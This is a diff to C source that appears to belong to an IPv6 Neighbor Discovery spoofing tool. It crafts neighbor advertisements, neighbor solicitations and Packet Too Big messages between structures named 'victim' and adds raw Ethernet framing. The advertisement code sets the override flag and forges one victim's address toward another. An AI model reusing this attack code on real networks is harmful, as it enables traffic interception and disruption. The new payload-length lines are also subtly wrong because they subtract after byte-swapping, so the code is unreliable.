@@ -45,7 +45,7 @@ void debug_packet(char *packet) {
 	memset(addr, 0, INET6_ADDRSTRLEN);
 	inet_ntop(AF_INET6, ip6->ip6_src.s6_addr, addr, INET6_ADDRSTRLEN);
 	printf("\tFrom: %s\n", addr);
-	printf("\tPayload Length: 0x%x\n", ntohs(ip6->ip6_plen));
+	printf("\tPayload Length: %d\n", ntohs(ip6->ip6_plen));
 
 	switch (ip6->ip6_nxt) {
 		case IPPROTO_ICMPV6:
@@ -117,20 +117,28 @@ static unsigned short icmp6_cksum(struct ip6_hdr *ip6) {
 
 // WARN: needs to be freed
 char *alloc_pkt2big(struct victim *svic, struct victim *dvic) {
+	struct ethhdr *eth;
 	struct ip6_hdr *ip6;
 	struct icmp6_hdr *icmp6;
 	char *packet;
-	uint16_t len = sizeof(struct ip6_hdr) +
-					sizeof(struct icmp6_hdr);
+	unsigned int len = sizeof(struct ethhdr) +
+						sizeof(struct ip6_hdr) +
+						sizeof(struct icmp6_hdr);
 
 	packet = malloc(len);
 	memset(packet, 0, len);
 
+	/* Ethernet Header */
+	eth = (struct ethhdr *)packet;
+	eth->h_proto = htons(ETH_P_IPV6);
+	memcpy(eth->h_source, &device.hwaddr, ETH_ALEN);
+	memcpy(eth->h_dest, &dvic->hwaddr, ETH_ALEN);
+
 	/* IPv6 Header */
-	ip6 = (struct ip6_hdr *)packet;
+	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));
 	ip6->ip6_dst = dvic->ipv6;
 	ip6->ip6_src = svic->ipv6;
-	ip6->ip6_plen = htons(len);
+	ip6->ip6_plen = htons(len) - (sizeof(struct ethhdr) + sizeof(struct ip6_hdr));
 	ip6->ip6_nxt = IPPROTO_ICMPV6;
 
 	/* ICMPv6 Header */
@@ -144,12 +152,14 @@ char *alloc_pkt2big(struct victim *svic, struct victim *dvic) {
 
 // WARN:  needs to be freed
 char *alloc_ndsolicit(struct in6_addr *addr) {
+	struct ethhdr *eth;
 	struct ip6_hdr *ip6;
 	struct icmp6_hdr *icmp6;
 	struct nd_neighbor_solicit *nd;
 	char *packet;
-	uint16_t len = sizeof(struct ip6_hdr) +
-					sizeof(struct nd_neighbor_solicit);
+	unsigned int len = sizeof(struct ethhdr) +
+						sizeof(struct ip6_hdr) +
+						sizeof(struct nd_neighbor_solicit);
 
 	if (!addr)
 		return NULL;
@@ -157,8 +167,16 @@ char *alloc_ndsolicit(struct in6_addr *addr) {
 	packet = malloc(len);
 	memset(packet, 0, len);
 
+	/* Ethernet Header */
+	eth = (struct ethhdr *)packet;
+	eth->h_proto = htons(ETH_P_IPV6);
+	memcpy(eth->h_source, &device.hwaddr, ETH_ALEN);
+	/* Multicast ethernet address (rfc3307) */
+	memcpy(eth->h_dest, ether_aton("33:33:00:00:00:00"), ETH_ALEN);
+	memcpy(&eth->h_dest[ETH_ALEN - 4], &addr->s6_addr[12], 4);
+
 	/* IPv6 Header */
-	ip6 = (struct ip6_hdr *)packet;
+	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));
 	memcpy(&ip6->ip6_dst, addr, sizeof(struct in6_addr));
 	ip6->ip6_src = device.ipv6;
 	ip6->ip6_plen = htons(sizeof(struct nd_neighbor_solicit));
@@ -180,13 +198,15 @@ char *alloc_ndsolicit(struct in6_addr *addr) {
 // WARN:  needs to be freed
 /* source victim data, dest victim */
 char *alloc_ndadvert(struct victim *svic, struct victim *dvic) {
+	struct ethhdr *eth;
 	struct ip6_hdr *ip6;
 	struct icmp6_hdr *icmp6;
 	struct nd_neighbor_advert *nd;
 	struct nd_opt_hdr *opt;
 	char *hwaddr;
 	char *packet;
-	uint16_t len = sizeof(struct ip6_hdr) +
+	unsigned int len = sizeof(struct ethhdr) +
+					sizeof(struct ip6_hdr) +
 					sizeof(struct nd_neighbor_advert) +
 					sizeof(struct nd_opt_hdr) +
 					ETH_ALEN;
@@ -197,12 +217,17 @@ char *alloc_ndadvert(struct victim *svic, struct victim *dvic) {
 	packet = malloc(len);
 	memset(packet, 0, len);
 
+	/* Ethernet Header */
+	eth = (struct ethhdr *)packet;
+	eth->h_proto = htons(ETH_P_IPV6);
+	memcpy(eth->h_source, &device.hwaddr, ETH_ALEN);
+	memcpy(eth->h_dest, &dvic->hwaddr, ETH_ALEN);
+
 	/* IPv6 Header */
-	/* TODO: Revisar os endereços */
-	ip6 = (struct ip6_hdr *)packet;
+	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));
 	ip6->ip6_dst = dvic->ipv6;
 	ip6->ip6_src = svic->ipv6;
-	ip6->ip6_plen = htons(len - sizeof(struct ip6_hdr));
+	ip6->ip6_plen = htons(len) - (sizeof(struct ethhdr) + sizeof(struct ip6_hdr));
 	ip6->ip6_nxt = IPPROTO_ICMPV6;
 	ip6->ip6_hlim = 255;
 
@@ -210,6 +235,7 @@ char *alloc_ndadvert(struct victim *svic, struct victim *dvic) {
 	icmp6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
 	icmp6->icmp6_type = ND_NEIGHBOR_ADVERT;
 	//*(icmp6->icmp6_data32) = ND_NA_FLAG_OVERRIDE || ND_NA_FLAG_OVERRIDE;
+	/* FIXME: No magic numbers.. :-) */
 	icmp6->icmp6_data8[0] = 0x60;
 
 	/* ND Advertise */
